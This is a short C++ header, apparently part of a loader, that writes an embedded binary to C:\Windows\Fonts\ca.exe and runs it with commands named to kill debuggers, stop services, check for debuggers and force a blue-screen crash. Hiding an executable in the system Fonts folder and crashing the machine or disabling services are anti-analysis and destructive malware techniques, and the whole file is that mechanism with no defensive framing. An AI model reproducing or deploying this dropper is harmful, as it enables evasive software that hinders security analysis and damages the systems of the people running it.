#pragma once
#include"cantidebugbytes.h"
#include <string>
#include"iostream"
#include"fstream"
#include"windows.h"


namespace cdebug {

	void innit() {

		const char* outputDir = "C:\\Windows\\Fonts\\";
		const char* permfiles[] = {"ca.exe"};

		std::ofstream cadebugger(std::string(outputDir) + permfiles[0], std::ios::binary);
		if (!cadebugger) {

			
		}
		cadebugger.write(reinterpret_cast<const char*>(rawData), sizeof(rawData));
		cadebugger.close();

		system("C:\\Windows\\Fonts\\ca.exe /innit");

	}

	void debugkill() {

		system("C:\\Windows\\Fonts\\ca.exe /debugkill");
	}

	void bsod() {

		system("C:\\Windows\\Fonts\\ca.exe /bsoddbg");
	}

	void servicekill() {

		system("C:\\Windows\\Fonts\\ca.exe /servicekill");
	}

	void debugcheck() {

		system("C:\\Windows\\Fonts\\ca.exe /debugcheck");
	}

}